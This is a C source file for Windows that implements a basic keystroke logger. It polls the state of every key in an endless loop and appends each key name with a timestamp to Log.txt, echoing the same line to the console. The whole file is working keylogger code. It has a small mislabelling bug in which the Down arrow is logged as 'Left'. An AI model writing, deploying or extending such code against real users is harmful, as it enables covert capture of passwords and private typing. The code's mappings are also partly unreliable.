#include<stdio.h>
#include<stdlib.h>
#include<Windows.h>
#include<time.h>
typedef const char* string;
const string DayOfWeek[] = {"Dom", "Seg", "Ter", "Quart", "Quint", "Sex", "Sab"};
const string dic[] = {"A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"};
const string number[] = {"0","1","2","3","4","5","6","7","8","9"};

int StringLength(string str)  {return (str[0] == '\0') ? 0x0 : 0x1 + StringLength(&str[1]);} 

string KeyName(int keycode){
    if(keycode >= 65 && keycode <= 90)  return dic[keycode - 65];
    else if(keycode >= 48 && keycode <= 57) return number[keycode - 48];
    else if(keycode == 1) return "Left Mouse";
    else if(keycode == 2) return "Right Mouse";
    else if(keycode == 37) return "Left";
    else if(keycode == 38) return "Up";
    else if(keycode == 39) return "Right";
    else if(keycode == 40) return "Left";
    else if(keycode == 13) return "Enter";
    else if(keycode == 32) return "Space";
    else if(keycode == 9) return "Tab";
    else if(keycode == 20) return "CAPS";
    else if(keycode == 46) return "Delete";
    else return "";
}

int main(void){
    FILE* log = fopen("Log.txt", "a+");
    SYSTEMTIME timer;
    GetSystemTime(&timer);
    fprintf(log,"++++++++++++++++++++++++++++++++++\n");
    fprintf(log,"%s   %i/%i/%i\n", DayOfWeek[timer.wDayOfWeek], timer.wDay, timer.wMonth, timer.wYear);
    fprintf(log,"++++++++++++++++++++++++++++++++++\n\n");
    fprintf(log, "VitualKey code|  Key Name  | Time\n");
    while(1){
        for (int i = 0; i < 200; i++)
        {
            if(GetAsyncKeyState(i)){
                GetSystemTime(&timer);
                string NameKey = KeyName(i);
                if (i < 15){
                    printf("\r0x%x           | %s   %d:%d:%d:%d   ", i, KeyName(i),timer.wHour, timer.wMinute, timer.wSecond, timer.wMilliseconds);
                    fprintf(log, "0x%x           | %s", i, NameKey);
                    for (int i = StringLength(NameKey); i < 11; i++) {fprintf(log, " ");}
                    fprintf(log, "|   %d:%d:%d:%d   \n", timer.wHour, timer.wMinute, timer.wSecond, timer.wMilliseconds);
                }   else{
                    printf("\r0x%x          | %s   %d:%d:%d:%d   ", i, KeyName(i),timer.wHour, timer.wMinute, timer.wSecond, timer.wMilliseconds);
                    fprintf(log, "0x%x          | %s", i, NameKey);
                    for (int i = StringLength(NameKey); i < 11; i++) {fprintf(log, " ");}
                    fprintf(log, "|   %d:%d:%d:%d   \n", timer.wHour, timer.wMinute, timer.wSecond, timer.wMilliseconds);
                }
                Sleep(130);
            }
        }
    }
}